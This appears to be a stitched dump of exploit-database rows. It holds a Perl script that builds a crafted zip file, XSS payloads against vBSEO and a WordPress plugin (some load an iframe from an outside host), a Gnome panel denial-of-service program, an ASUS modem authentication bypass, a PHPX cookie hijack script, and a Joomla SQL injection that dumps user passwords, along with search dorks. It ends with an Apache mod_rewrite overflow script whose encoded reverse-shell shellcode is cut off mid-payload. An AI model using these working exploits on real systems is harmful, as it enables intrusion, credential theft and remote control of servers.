""\x30\x1F\xDA\x0A\xD3\x75\xAD\x65\x1A\x2D\x71\xEE\x81\xC8\x08\x69\x65\xD0\xDF\x4D\x33\xEE\x34\x6B\x71\x7A\xF9\x84\x64\x96\xC8\x95\x6E\x21\x51\xF9"". ""\x87\xB4\xDA\xE3\xB4\xBC\x8D\x82\xB7\x42\xF0\x36\x8A\xEF\x84\x76\x52\xEB\xF4\x3D\xC4\x1B\x2E\x78\xF3\x05\x6F\xCF\x50\x2A\xCC\x9D\x52\xAF\xAE\x4C"". ""\x9A\x29\x55\xC2\xB0\x5B\xCF\x03\xC3\x94\xA9\x89\xE4\xCA\x5F\xCD\xE9\x2A\xF8\x50\x9B\xA4\x2A\x59\xA1\x7E\x98\x03\xF8\x10\xAE\xC7\x95\x43\xB5\x16"". ""\xA0\x42\xA4\x62\x9B\x3F\xAA\xE2\xF3\x15\xEF\xE6\x4C\xDE\x9A\xDB\x85\x44\x26\x53\x8A\xD9\x6A\xB1\x9A\xCC\x96\xFB\xEF\x52\x1B\x74\xA7\x2E\x47\x13"". ""\x81\x8F\xB9\x0F\x5D\x9A\x1B\x9F\x68\xEE\xE0\xDC\xD0\x27\xD3\x32\x75\xF8\xC0\x5D\x0C\xD1\x74\xC8\x31\x91\xD5\x2A\x99\xA4\x61\x29\x26\xAB\x7E\x5C"". ""\x2A\x93\xFA\xD0\xC9\x97\x06\x74\x0D\xAD\xE8\xA6\x82\x6A\xE7\x58\x76\xBD\xAA\x3D\x3D\xC5\x62\x62\x0C\xA8\x7D\xAE\xDA\x6D\x89\x0E\x75\x76\x8A\xAA"". ""\x89\x12\x90\x19\xE7\xEE\xE4\xCB\x4A\xB5\xDB\x6A\xC6\xE7\x5D\xD8\x11\x84\xAD\xE3\xD2\x9E\xEE\xBC\x5B\x02\x2A\x71\x4F\x54\xED\x8E\xC2\x28\x2B\x0F"". ""\x99\x64\x74\xF8\x62\xF8\x24\xA3\x0C\x6E\xAD\x1B\x4D\x5E\x2F\x4B\x53\xBA\x7A\xBB\xF3\x33\x21\x99\x46\x96\xC6\x25\xB8\xF9\x2C\xE5\x2D\xC2\x80\xA6"". ""\x09\x32\xB9\xF3\x8F\xF4\xDE\x5D\x89\x86\x3A\x37\x75\xE3\x68\xA2\x57\x31\xEA\xF4\xAA\x92\x0E\x95\x6D\xDF\xF0\x69\xCD\xF6\x14\x4A\xAD\xB7\xDB\xD4"". ""\xF6\xB3\x13\xE1\x0F\xDA\x78\x1C\xC2\xB5\x6C\xA1\x7B\xBB\x72\xFA\x85\xE6\x68\x7A\xC6\xEB\xE3\x3A\x4B\xBF\x2C\x18\x18\x04\x4A\xA7\x9D\xEA\x9F\x9E"". ""\x2E\xF8\x4D\xC0\x13\x0B\xA7\x38\xB8\x56\x76\xAF\xFA\xAC\x2D\xFF\x3C\x53\xFA\x05\xEA\xB5\xE0\x08\x9F\x98\x95\x6E\x21\xFA\xD0\xA2\x1E\xB9\xFE\xEE"". ""\x40\x54\x3F\x62\x4A\x96\x76\xB7\x15\x6D\x55\x37\x02\x96\x5E\xBF\x19\x03\xAC\x76\x75\x90\x65\xC0\x80\x81\x2B\x04\x27\x31\xCC\xC0\x88\xA0\x5F\x38"". ""\x7F\x8B\x0E\xDC\xF7\xE4\xD1\x13\x4B\xBD\x99\x3B\x1E\x4A\xA5\x29\x37\x3C\xFF\x9E\x03\x61\xED\x88\xC8\xD2\xE2\x79\x0C\xCB\x77\x3E\x45\x62\xBB\xCF"". ""\x6E\x12\x7D\xCC\x0B\x44\x6A\x07\xF4\x26\xA9\x43\x56\x7A\x97\xC4\x40\xE6\x43\x12\x23\xB0\x63\xC4\xB3\x50\x21\x84\x65\xF1\x2C\x9D\xC7\xBA\x05\x92"". ""\x18\xE7\x4E\x93\xB4\x93\xD4\x12\xCF\x1B\xD1\x51\x4A\xFC\x77\x08\x88\x6E\x87\xCD\x7F\x29\x60\xB5\x24\xC6\x12\xDC\x39\x62\x38\x4C\x21\x49\xE4\x83"". ""\x3F\x86\x79\x9A\xCE\x30\x03\xDD\x7F\x1E\x69\x93\x75\x78\xF3\xB4\x7C\xA9\x51\xA7\x89\x8B\x77\x73\x7E\x97\x04\xC3\xAD\x4E\xBF\x90\xC9\xE5\x6A\x6F"". ""\x6F\x57\xDD\xAC\x6B\x16\x09\x37\x77\xB2\x09\xBB\xFD\x4B\x1C\x45\x0E\x1E\x01\x62\x7C\x3F\x26\x8F\x65\xAA\xEE\x77\x47\xBD\xBA\xD5\x32\xC7\xA4\xBA"". ""\xDF\x7A\xF7\xB9\x45\x4F\xBF\x26\xA9\xEE\x3D\x35\xD7\xF2\x69\x71\xB3\xA6\x9F\x6D\xEE\xC6\xD9\xE6\xAE\xBC\x6F\x4D\xC6\x80\x01\x03\x06\x0C\x18\x30"". ""\x60\xC0\x80\x01\x03\x06\x0C\x18\x18\x3A\x06\x9A\xFF\x73\x88\xE9\x9D\x3F\xBD\xB3\xB5\xE8\x9A\xCC\x2D\x8F\x60\xFE\x3F\xF5\xC4\x2F\xAB\x11\x66\x4D"". ""\x08\xE3\xB9\xFA\x11\x12\xF3\x75\x9E\xBF\x7A\x49\xCC\xD1\x43\x24\xE6\xDA\x9D\x24\xE6\xE3\x1B\x49\xEC\x18\xE8\x22\xB1\x93\x82\xD7\x0E\x78\xAE\xFF"". ""\x14\x89\xB9\xFC\x33\x24\xE6\xF2\xBB\x49\xFC\x55\xAF\x3D\x24\xE6\xFE\x7B\x35\xD9\x7F\x21\x91\xA7\x4F\xBE\x16\xF3\x71\x9E\x9F\x87\xC5\x24\x5F\x9D"". ""\x23\xF3\x3C\xDC\xAC\xE9\x64\x7B\x7A\xBA\xB0\x0F\x5E\x9D\x46\xFA\x1A\xED\x40\x76\x5E\xA6\xC8\x7B\xDF\xBA\x41\x46\xA6\xD0\xA6\xAF\x26\x2C\xF7\x45"". ""\xFD\x6E\xD2\xE7\xE8\x8B\xB2\xFB\xE6\xE5\xB2\x16\x36\x93\xC4\x1D\x15\x9A\x9F\xDD\x9C\xEF\xC6\xBA\x9A\xEA\xC6\x05\x7C\x32\xBE\xA1\x37\xFF\x73\x61"". ""\x5B\xB4\xDF\xF1\x58\xCE\x1C\x1A\xAE\xDA\x3A\x89\xFA\xCA\x32\x8E\xC4\x5F\x7D\x1B\xEA\xBE\x91\x71\xD4\xB7\x59\x81\x65\x7A\xA9\xF8\x14\x1D\x89\xBA"". ""\x1C\x36\xE3\x88\xD6\x95\x67\x92\x1D\x8D\x31\x8C\x61\x2E\x06\x93\xEC\x50\x87\x61\x0C\x73\x39\x9A\x64\x47\x38\x2E\x76\x93\xAC\x7C\x97\x67\xA9\x0D"". ""\x63\x98\x73\x63\x92\x1D\x2E\x31\x8C\x61\x0C\xF3\x4D\x8D\x71\x44\xCB\x38\xA2\x75\x65\x99\x0B\x73\x44\x2B\x7E\x4D\xCA\xC0\x85\x85\xBE\x56\xC9\x6B"". ""\x80\xBC\xC7\x89\xD7\x01\x79\xC5\x93\xD7\x57\x79\xAF\x16\xEF\xD3\xE2\xBD\x59\xBC\x56\xCA\xEB\x95\xBC\x26\xCB\xFF\xEF\x87\xD7\x78\x33\x49\xAC\xE9"". ""\xF2\x1E\x2E\x5E\xBB\xE5\x35\x58\xDE\xB9\xCD\xEB\xB7\xA3\xB4\x74\x57\x93\x7A\x38\x87\xAE\x21\xB1\x8E\x79\x2D\x89\x55\xD5\x71\x5A\xFC\x78\xD8\x13"". ""\xC0\xEB\x48\xFC\xF7\x93\x89\xE0\xF5\xE0\x0D\x5A\xFC\x24\xD8\x93\x89\x4F\x96\x11\x4D\x05\x0B\xC1\x22\x90\xDB\x91\x03\x2C\x01\x4B\xB5\xB4\x5F\x83"". ""\xD3\x35\xB7\x4E\x03\x67\x06\x6F\x84\x0F\xAA\xA7\xEA\xE6\xA9\xE7\xE7\xC2\xD4\x41\x83\x41\x2E\x59\x25\x5D\x16\xB7\xA1\x14\x9B\xF8\x2D\x61\xAF\x88"". ""\x9E\x1F\x9F\xB6\xE2\x37\xEB\xD4\xFF\x8C\x72\x23\x69\xFB\xFF\x89\x4F\xFC\x39\xD5\x93\x6E\x43\x45\x1A\x99\x7A\xF5\x33\x92\xA5\x67\xF0\x5E\xC2\x67"". ""\xB2\x85\xBB\x24\xEE\x5C\xE0\x50\x30\x1C\xFA\xF5\xDF\x0E\xCE\x56\xFF\x68\xBE\x64\x0A\xF7\x4A\x75\x1D\xDF\x85\x7A\x08\x52\x13\xB5\xA9\x07\x15\xF4"". ""\x73\x8C\x67\x83\x31\xD0\xCF\x35\xCE\xEF\xED\xD9\xEA\x67\xF0\xFF\x6D\x62\x58\xA9\x41\xD5\xCA\xBF\x1C\xF0\xB3\xE7\xD3\x76\x9E\xDE\xD3\x91\xFA\x09"". ""\xBE\x81\x51\x30\x84\xFA\x97\xF9\x92\x29\xDC\xD6\x7E\x25\x1F\x5C\x7E\x66\x42\x3F\x7F\xB7\x06\xA3\xBF\x00\xEC\xD4\x4E\x47\x48\x54\xA5\xFE\x52\x12"". ""\xA2\xA5\x68\x05\x2D\x67\xBC\xEF\x74\xC8\x52\x8F\xEA\x0C\xAE\xFC\x8C\xC1\x6B\x1A\x18\x43\xD1\xAF\x83\xDB\xAE\xF1\x9D\xBC\x72\x21\xE1\xE9\x9B\xD3"". ""\x44\x1B\x4A\xFC\x76\xF3\x77\x2A\x61\x6F\x73\x75\xB0\xA9\xAD\xD5\x1D\x88\xAA\x63\x82\xC5\x0D\x1C\x86\x20\xF5\x65\x66\x77\x91\x1E\x5F\x34\x93\x8E"". ""\xCD\xFA\xD5\xBA\xD3\x36\x39\x03\x17\x11\xFE\x0F\x50\x4B\x01\x02\x14\x0B\x14\x00\x00\x00\x08\x00\x99\x3D\xE9\x34\xD6\xA6\xCB\xA3\xA9\x0D\x00\x00"". ""\x00\x72\x00\x00\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x77\x6F\x72\x64\x68\x6C\x69\x6E\x6B\x2E\x64\x6F\x63\x50"". ""\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00\x3B\x00\x00\x00\xD4\x0D\x00\x00\x00\x00"";  open(olly, "">unzipme!.zip"") || die ""Can't Write temporary File\n""; binmode (olly); print olly $all; close (olly); print ""zip file ready, have fun..\n"";  # milw0rm.com [2006-07-09]","['2000/2003', '2003']",0
16077,"vBSEO Sitemap 2.5/3.0 - Multiple Vulnerabilities vBSEO Sitemap - Multiple Vulnerabilities   Versions Affected: 2.5 and 3.0 (Most likely all versions)  Info: A proven success record, vBSEO powers the most optimized forums on the Web. The #1 SEO plugin and the only professional, fully supported solution. A full package of SEO enhancements, one install, one upgrade.  External Links: http://www.vbseo.com  Credits: MaXe (@InterN0T)   -:: The Advisory ::- vBSEO is prone to multiple vulnerabilities, such as path disclosure, enumeration of files, persistent and non-persistent XSS. Please see the details below.  vBSEO Sitemap 3.0 Gold: Enumeration and confirmation of files: http://www.target.tld/vbulletin/upload/vbseo_sitemap/index.php?rlist=true&details=../../../vb4_readme.txt http://www.target.tld/vbulletin/upload/vbseo_sitemap/index.php?hitdetails=../../../../vb4_readme.txt  Proof of Concept XSS: (Non-Persistent) http://www.target.tld/vbulletin/upload/vbseo_sitemap/index.php?dlist=true&botsonly=%22%3E%3Ciframe%20frameborder=%270%27%20border=0%20width=%27425%27%20height=%27344%27%20src=%27http://pown.it/obj.php?ID=5312%27%20name=iframe%20scrolling=no%20style=%27position:absolute;%27%20allowtransparency=%27true%27%3E%3C/iframe%3E http://www.target.tld/vbulletin/upload/vbseo_sitemap/index.php?hitdetails=PADPAD%20%3Ciframe%20frameborder=%270%27%20border=0%20width=%27425%27%20height=%27344%27%20src=%27http://pown.it/obj.php?ID=3663%27%20name=iframe%20scrolling=no%20style=%27position:absolute;%27%20allowtransparency=%27true%27%3E%3C/iframe%3E  Path Disclosure: (any file in the addon directory - includes fatal errors) http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_calendar.php http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_downloads.php http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_downloads2.php http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_medialibrary.php http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_vba.php http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_vba_links.php http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_vba_links3.php http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_vbagallery.php  ----------------------- END OF vBSEO 3.0 -----------------------  vBSEO Sitemap 2.5: (initial first release)  Enumeration and confirmation of files: http://www.target.tld/vbseo_sitemap/index.php?details=../../robots.txt http://www.target.tld/vbseo_sitemap/index.php?hitdetails=../../../robots.txt  Non-Persistent XSS: (PoC) http://www.target.tld/vbseo_sitemap/index.php?dlist=true&botsonly=%22%3E%3Cscript%3Edocument.documentElement.innerHTML=%22%3Ciframe%20frameborder=%270%27%20border=0%20width=%27425%27%20height=%27344%27%20src=%27http://pown.it/obj.php?ID=5312%27%20name=iframe%20scrolling=no%20style=%27position:absolute;%27%20allowtransparency=%27true%27%3E%3C/iframe%3E%22;%3C/script%3E [May require bot hits to work!] http://www.target.tld/vbseo_sitemap/index.php?removedl[0]=&botsonly=%22%3E%3Cscript%3Edocument.documentElement.innerHTML=%22%3Ciframe%20frameborder=%270%27%20border=0%20width=%27425%27%20height=%27344%27%20src=%27http://pown.it/obj.php?ID=5312%27%20name=iframe%20scrolling=no%20style=%27position:absolute;%27%20allowtransparency=%27true%27%3E%3C/iframe%3E%22;%3C/script%3E http://www.target.tld/vbseo_sitemap/index.php?hitdetails=PADPAD%20%3Ciframe%20frameborder=%270%27%20border=0%20width=%27425%27%20height=%27344%27%20src=%27http://pown.it/obj.php?ID=3663%27%20name=iframe%20scrolling=no%20style=%27position:absolute;%27%20allowtransparency=%27true%27%3E%3C/iframe%3E  Path Disclosure: (any file in the addon directory - includes fatal errors) http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_calendar.php http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_downloads.php http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_downloads2.php http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_vba.php http://www.target.tld/vbulletin/upload/vbseo_sitemap/addons/vbseo_sm_vba_links.php http://www.target.tld/includes/functions_vbseo_url.php  ----------------------- END OF vBSEO 2.5 -----------------------  vBSEO Sitemap: (Most likely all versions) Persistent XSS:  1) The user-agent is not sanitized in a sufficient way allowing an attacker to inject persistent scripts. 2) Then the attacker must request the sitemap via one of the following links: - http://www.target.tld/vbulletin/upload/vbseo_sitemap/index.php?dlist=true - http://www.target.tld/vbulletin/upload/vbseo_sitemap/vbseo_getsitemap.php?sitemap=sitemap_index.xml.gz  3) Then an authenticated administrator must view one of the pages containing the injected and potentially malicious user-agent: http://www.target.tld/vbseo_sitemap/index.php?dlist=true&page=357   [!] All vulnerabilities requires authentication and they do not survive a login screen, making them almost harmless.   -:: Solution ::- Before: (file: index.php within vbseo_sitemap) -- Version 2.5 <tr class=""<?php echo $dd%2?'altfirst':'altsecond'?>"">         <td><?php echo $dn+($cpage-1)*VBSEO_SM_PAGESIZE?></td>         <td align=""right""><?php echo $sdate?></td>         <td><?php echo $dl['sitemap']?></td>         <td><b><?php echo $dl['ua']?></b></td>         <td><?php echo $dl['ip']?></td>         <td><?php echo $dl['useragent']?></td>         <td> <a href=""index.php?removedl[<?php echo $dn?>]=<?php echo $dl['time']?>&botsonly=<?php echo $_GET['botsonly']?>"" onclick=""return confirm('Are you sure?')"">Rem$         </td>         <td> <input type=""checkbox"" name=""removedl[<?php echo $dn?>]"" value=""<?php echo $dl['time']?>"">         </td> </tr>  After:_______________________________________________________ <tr class=""<?php echo $dd%2?'altfirst':'altsecond'?>"">         <td><?php echo $dn+($cpage-1)*VBSEO_SM_PAGESIZE?></td>         <td align=""right""><?php echo $sdate?></td>         <td><?php echo $dl['sitemap']?></td>         <td><b><?php echo $dl['ua']?></b></td>         <td><?php echo $dl['ip']?></td>         <td><?php echo htmlentities($dl['useragent'])?></td>         <td> <a href=""index.php?removedl[<?php echo $dn?>]=<?php echo $dl['time']?>&botsonly=<?php echo $_GET['botsonly']?>"" onclick=""return confirm('Are you sure?')"">Rem$         </td>         <td> <input type=""checkbox"" name=""removedl[<?php echo $dn?>]"" value=""<?php echo $dl['time']?>"">         </td> </tr> ---------------------------------------------------------------------------------------------  Before: (file: index.php within vbseo_sitemap) -- Version 3.0 <tr class=""<?php echo $dd%2?'altfirst':'altsecond'?>"">         <td class=""<?php echo $dd%2?'alt1':'alt2'?>""><?php echo $dn+($cpage-1)*VBSEO_SM_PAGESIZE?></td>         <td class=""<?php echo $dd%2?'alt1':'alt2'?>"" align=""right""><?php echo $sdate?></td>         <td class=""<?php echo $dd%2?'alt1':'alt2'?>""><?php echo $dl['sitemap']?></td>         <td class=""<?php echo $dd%2?'alt1':'alt2'?>""><b><?php echo $dl['ua']?></b></td>         <td class=""<?php echo $dd%2?'alt1':'alt2'?>""><?php echo $dl['ip']?></td>         <td class=""<?php echo $dd%2?'alt1':'alt2'?>""><?php echo htmlentities($dl['useragent'])?></td>         <td class=""<?php echo $dd%2?'alt1':'alt2'?>"">  After:_______________________________________________________ <tr class=""<?php echo $dd%2?'altfirst':'altsecond'?>"">         <td class=""<?php echo $dd%2?'alt1':'alt2'?>""><?php echo $dn+($cpage-1)*VBSEO_SM_PAGESIZE?></td>         <td class=""<?php echo $dd%2?'alt1':'alt2'?>"" align=""right""><?php echo $sdate?></td>         <td class=""<?php echo $dd%2?'alt1':'alt2'?>""><?php echo $dl['sitemap']?></td>         <td class=""<?php echo $dd%2?'alt1':'alt2'?>""><b><?php echo $dl['ua']?></b></td>         <td class=""<?php echo $dd%2?'alt1':'alt2'?>""><?php echo $dl['ip']?></td>         <td class=""<?php echo $dd%2?'alt1':'alt2'?>""><?php echo htmlentities($dl['useragent'])?></td>         <td class=""<?php echo $dd%2?'alt1':'alt2'?>""> 	 ---------------------------------------------------------------------------------------------  In addition, vbseo_getsitemap.php which grabs the unsanitized user-agent can also be fixed by finding this line: 'useragent'=>$_SERVER['HTTP_USER_AGENT'],  And changing it to this: 'useragent'=>htmlentities($_SERVER['HTTP_USER_AGENT']),    Disclosure Information: - Vulnerability found and researched: ~27th December 2010 - Semi-Disclosed at InterN0T: 30th December - Detailed Disclosure: 31st January 2011   References: http://forum.intern0t.net/intern0t-advisories/3632-vbseo-sitemap-2-5-3-0-multiple-minor-vulnerabilities.html",['2.5/3.0'],1
11044,"Gnome Panel 2.28.0 - Denial of Service (PoC) # Tested on: ubuntu 9.10 # CVE :  # Code :  /********************************************************************************* *	        Gnome panel <= 2.28.0 denial of service poc 0-day		 * *		     by  Pietro Oliva <pietroliva@gmail.com> *                         http://olivapietro.altervista.org *										 * *	      After executing this poc a backup file will be created             * *                You can restore it by typing ./paneldos restore                 * *           Using option restart gnome-panel will restart continuously           * *          Using option totalblock you will need to remove the battery           * *       After execution click application in the panel, then go to places        * *                             and wait some seconds...   			 * *       https://bugs.launchpad.net/ubuntu/+source/gnome-panel/+bug/503868        * **********************************************************************************/    #include <stdio.h> #include <string.h> int main(int argc, char **argv) { 	FILE *f; 	unsigned long i; 	printf(""%s"",""Gnome panel <= 2.28.0 denial of service by Pietro Oliva poc 0-day\n\n""); 	if(!(f=fopen("".gtk-bookmarks"",""r""))) 	{ 		printf(""%s"",""file not found! make sure you are running\nthis file from your home directory\n""); 		return 1; 	} 	fclose(f); 	if((argv[1]==NULL)) 	{ 		printf(""%s"",""please specify an argument!\n""); 		printf(""%s"",""usage: ./paneldos <option>\npossible options are:\trestart\t\ttotalblock\trestore\n""); 		return 1; 	} 	if(((strcmp(argv[1],""restart""))==0)) 	i=9999; 	else if((strcmp(argv[1],""totalblock""))==0) 	i=99999; 	else if((strcmp(argv[1],""restore""))==0) 	{ 		if(!(f=fopen("".backup"",""r""))) 		{ 			printf(""%s"",""no backup found!\nmake sure you are running\nthis file from your home directory\n""); 			return 1; 		} 		fclose(f); 		system(""cp .backup .gtk-bookmarks""); 		printf(""%s"",""succesfully restored!\n""); 		return 0; 	} 	else 	{ 		printf(""%s"",""usage: ./paneldos <option>\npossible options are:\trestart\t\ttotalblock\trestore\n""); 		return 1; 	} 	if(!(f=fopen("".backup"",""r""))) 	{	 		printf(""%s"",""creating backup...\n""); 		system(""cp .gtk-bookmarks .backup""); 	} 	else 	fclose(f); 	f=fopen("".gtk-bookmarks"",""a""); 	printf(""%s"",""starting...\n""); 	fwrite(""file:///home "",1,13,f); 	while(i>0) 	{ 		fwrite(""\ta"",1,2,f); 		i--; 	} 	fclose(f); 	printf(""%s"",""done! now click applications in panel,\nslide to places, wait and see the result! :D\n""); 	return 0; }",['2.28.0'],1
41376,"WordPress Plugin Corner Ad 1.0.7 - Cross-Site Scripting # Exploit Title: Authorized Stored XSS at WordPress Corner-Ad plugin. # Google Dork: inurl:/wp-content/plugins/corner-ad # Date: 16-02-17 # Exploit Author: Atik Rahman # Vendor Homepage: https://wordpress.org/plugins/corner-ad/ # Software Link: https://downloads.wordpress.org/plugin/corner-ad.zip # Version: 1.0.7 # Tested on: Firefox 44, Windows10   Vendor Description ---------------------  *Corner Ad* is a plugin which display you ads in a corner of your WordPress website page.  The Plugin has 1,000+ active install.   Stored XSS in Ad Name ----------------------  Ad name input fields aren't properly escaped. This could lead to an XSS attack that could possibly affect administrators,users,editor.     1. Go to http://localhost/wp-admin/options-general.php?page=corner-ad.php  2. Click on create new Add button.  3. And Use Ad name as ""/><svg/onload=prompt(document.domain)> *Fill the other field.  4.Now Click on save corner Add button when it's add a new add go to the http://localhost/wp-admin/options-general.php?page=corner-ad.php for corner add list. And now Your xss will  be executed.  5. If a normal editor,author visit the corner add list page xss will effect them also.",['1.0.7'],1
45201,"ASUS-DSL N10 1.1.2.2_17 - Authentication Bypass # Title: ASUS-DSL N10 1.1.2.2_17 - Authentication Bypass # Author: AmnBAN team # Date: 2018-08-06 # Vendor Homepage: https://www.asus.com/Networking/DSLN10_C1_with_5dBi_antenna/ # Sofrware version: 1.1.2.2_17 # CVE: N/A  # 1. Description: # In ASUS-DSL N10 C1 modem Firmware Version 1.1.2.2_17 there is login_authorization  # parameter in post data, that use for authorization access to admin panel,  # the data of this parameter is not fully random and you can use old data  # or data of another device to access admin panel.  # 2. Proof of Concept: # Browse http://<Your Modem IP>/login.cgi  # Send this post data: group_id=&action_mode=&action_script=&action_wait=5&current_page=Main_Login.asp&next_page=%2Fcgi-bin%2FAdvanced_LAN_Content.asp&login_authorization=YWRtaW46MQ%3D%2D  # Or this post data: group_id=&action_mode=&action_script=&action_wait=5&current_page=Main_Login.asp&next_page=%2Fcgi-bin%2FAdvanced_LAN_Content.asp&login_authorization=FWRtaW46MQ%3D5D","['N10', '1.1.2.2_17']",0
23644,"PHPX 3.2.3 - Multiple Vulnerabilities source: https://www.securityfocus.com/bid/9569/info  Multiple vulnerabilities were reported in PHPX. The specific issues include cross-site scripting, HTML injection and account hijacking via specially crafted cookies.  These issues were reported to exist in PHPX 3.2.3. Earlier versions are also likely affected.  <?php /* Proof of concept for exploiting PHPX 3.2.4 (http://www.phpx.org) */ /* Quick hack, not really an affective tool, only useful as a demonstration */ /* Written by HelloWorld - Ryan Wray */  /* Usage: php -q exploit_file.php <host> <port> <admin_folder_location> */ function usage() {     echo ""Usage request""; }  function bytes_left($fp) {     $status=socket_get_status($fp);     if($status['unread_bytes'] > 0) { return true; }     return false; } print_r($_SERVER['argv']); if($_SERVER['argc'] != 4) {     exit(usage()); }  // Attempt to connect to host. $fp=@fsockopen($_SERVER['argv'][1],$_SERVER['argv'][2]);  if(!$fp) {     exit('Could not connect to host: '.$_SERVER['argv'][1].':'.$_SERVER['argv'][2]); }  else {     fputs($fp,""GET "".$_SERVER['argv'][3].""index.php HTTP/1.1\r\n"");     fputs($fp,""Host: "".$_SERVER['argv'][1].""\r\n"");     fputs($fp,""Cookie: PXL=2\r\n\r\n""); } // Start accepting data, otherwise socket_get_status will say there are 0 unread bytes. echo fgets($fp,1024); // While we can read. while(bytes_left($fp)) {     echo fgets($fp,1024); } // Close the socket. fclose($fp); ?>","['3.2.3', '3.2.4']",1
4827,"Joomla! Component PU Arcade 2.1.3 - SQL Injection #########################################################################           Joomla Component  PU Arcade Remote SQL Injection Exploit #########################################################################  ## AUTHOR :  HouSSamix of H-T TeaM We are ( HouSSamix _ ToXiC350 _ CoNaN )   ## HOME : http://no-hack.net  ## Script :  PU Arcade Joomla Component ( Tested in version 2.0.3 & 2.1.3 Beta )  ## Download : http://www.pragmaticutopia.com/  ## DorKs :  PU Arcade by www.pragmaticutopia.com                          inurl:index.php?option=com_puarcade                          inurl:/option,com_puarcade/ 			 ## EXPLOIT :  http://server.com/Path/index.php?option=com_puarcade&Itemid=92&fid=-1%20union%20select%20concat(username,0x3a,password)%20from%20jos_users--   ## GREETZ  :  GoLd_M , RoMaNcYxHaCkEr , Jiko , cx0x  and all musulmans hackers  #########################################################################            Joomla Component  PU Arcade Remote SQL Injection Exploit #########################################################################  # milw0rm.com [2007-12-31]","['2.1.3', '2.0.3']",1
3680,"Apache mod_rewrite (Windows x86) - Off-by-One Remote Overflow #!/bin/sh # Exploit for Apache mod_rewrite off-by-one(Win32). # # by axis <axis@ph4nt0m> # http://www.ph4nt0m.org # 2007-04-06 # # Tested on Apache 2.0.58 (Win32) # Windows2003 CN SP1 # # Vulnerable Apache Versions: # * 1.3 branch: >1.3.28 and <1.3.37 # * 2.0 branch: >2.0.46 and <2.0.59 # * 2.2 branch: >2.2.0 and <2.2.3 # # # Vulnerability discovered by Mark Dowd. # CVE-2006-3747 #  # first POC by jack <jack\x40gulcas\x2Eorg> # 2006-08-20 # http://www.milw0rm.com/exploits/2237 # # #  # to successfully exploit the vuln,there are some conditions # http://www.vuxml.org/freebsd/dc8c08c7-1e7c-11db-88cf-000c6ec775d9.html #  #  # some compilers added padding to the stack, so they could not be exploited,like gcc under redhat #  # for more details about the vuln please see: # http://www.securityfocus.com/archive/1/archive/1/443870/100/0/threaded #  #  # no opcodes needed under windows! # it will directly run our shellcode #  # my apache config file # [httpd.conf]: # RewriteEngine on # RewriteRule 1/(.*) $1 # RewriteLog ""logs/rewrite.log"" # RewriteLogLevel 3 #  #  # Usage: # [axis@security-lab2 xploits]$ sh mod_rewrite.sh 10.0.76.141 # mod_rewrite apache off-by-one overflow #  # [axis@opensystemX axis]$ nc -vv -n -l -p 1154 # listening on [any] 1154 ... # connect to [x.x.x.111] from (UNKNOWN) [10.0.76.141] 4077 # Microsoft Windows [¡ã?¡À? 5.2.3790] # (C) ¡ã?¨¨¡§?¨´¨®D 1985-2003 Microsoft Corp. #  # D:\Apache\Apache2>exit # exit #  sent 5, rcvd 100 #  #  #  # shellcode µÄbadchar£¬ÎÒÕâÀïÓÃµÄ£¬ÆäÊµ²»ÐèÒªÄÇÃ´¶à # ÎÒ¸úµ½Á½¸öbadcharÊÇ 0x3fºÍ 0x0b ÆäËû¶¼ÊÇÒÔÇ°Éú³ÉshellcodeÏ°¹ßÐÔ±£ÁôµÄ # 0x00 0x3a 0x22 0x3b 0x7d 0x7b 0x3c 0x3e 0x5c 0x5d 0x3f 0x0b #   echo -e ""mod_rewrite apache off-by-one overflow""   if [ $# -ne 1 ] ; then   echo ""Usage: $0 webserver""   exit fi  host=$1  #use ldap:// to trigger the vuln, ""Ph4nt0m"" is any arbitrary string echo -ne ""GET /1/ldap://ph4nt0m/`perl -e 'print ""Ph4nt0m""x5'`\   # %3f to trigger the vuln %3fA%3fA%3f\     #string ""CCCC.."" is any arbitrary string, use %3f to trigger the vuln #%90 is the machine code we will jmp to(NOP),run shellcode from here `perl -e 'print ""C""x10'`%3fC%3f%90\     # shellcode,reverse shell to 192.168.0.1 ,port 1154  alpha2 encoded `perl -e 'print ""\     \xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49\ \x49\x49\x49\x49\x49\x49\x49\x49\x49\x37\x49\x49\x51\x5a\x6a\x63\ \x58\x30\x42\x30\x50\x42\x6b\x42\x41\x73\x42\x32\x42\x41\x41\x32\ \x41\x41\x30\x41\x41\x58\x50\x38\x42\x42\x75\x69\x79\x79\x6c\x51\ \x7a\x6a\x4b\x50\x4d\x4d\x38\x6b\x49\x79\x6f\x49\x6f\x6b\x4f\x65\ \x30\x4c\x4b\x72\x4c\x45\x74\x51\x34\x4e\x6b\x71\x55\x77\x4c\x6c\ \x4b\x33\x4c\x64\x45\x33\x48\x64\x41\x5a\x4f\x4c\x4b\x72\x6f\x36\ \x78\x4c\x4b\x73\x6f\x45\x70\x66\x61\x4a\x4b\x53\x79\x4e\x6b\x44\ \x74\x4e\x6b\x73\x31\x38\x6e\x55\x61\x79\x50\x6c\x59\x6c\x6c\x4b\ \x34\x6f\x30\x74\x34\x34\x47\x59\x51\x5a\x6a\x76\x6d\x76\x61\x6f\ \x32\x5a\x4b\x79\x64\x55\x6b\x33\x64\x51\x34\x41\x38\x30\x75\x4b\ \x55\x6e\x6b\x33\x6f\x44\x64\x46\x61\x7a\x4b\x32\x46\x6e\x6b\x34\ \x4c\x42\x6b\x6e\x6b\x73\x6f\x77\x6c\x54\x41\x58\x6b\x43\x33\x74\ \x6c\x6c\x4b\x4d\x59\x50\x6c\x74\x64\x75\x4c\x52\x41\x6f\x33\x50\ 